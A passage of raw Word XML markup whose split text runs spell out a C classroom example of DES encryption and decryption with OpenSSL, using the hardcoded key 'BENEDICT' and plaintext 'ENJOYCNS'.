        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_odd_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>ar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>Key2 ); D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:t>se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t>ey_chec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed( </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key2, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>sched</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e );</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>* Decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>occurs here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_cfb64_encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>( u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char * ) Msg, ( u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gned</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>char * ) R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>s,s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ze,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>schedu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Key2, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:t>n, D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>S_D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:t>YPT</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>urn (R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>s);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pP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810"/>
      </w:pPr>
      <w:r>
        <w:t>char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>key[]="B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>DIC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>";</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810"/>
      </w:pPr>
      <w:r>
        <w:t>char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[]="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>NJ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:t>YCNS";</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="3177"/>
      </w:pPr>
      <w:r>
        <w:t>char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*decryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>; char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>*encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:t>; encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc(s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>eof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; decry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oc(s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>eof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%s",p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>nP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n Hex Code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t\</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%X",p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">nKey </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>H</w:t>
      </w:r>
      <w:r>
        <w:t>ex Code</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>%X",key);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="577"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>cpy(encry</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>cryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>eof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>)), s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>zeof(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
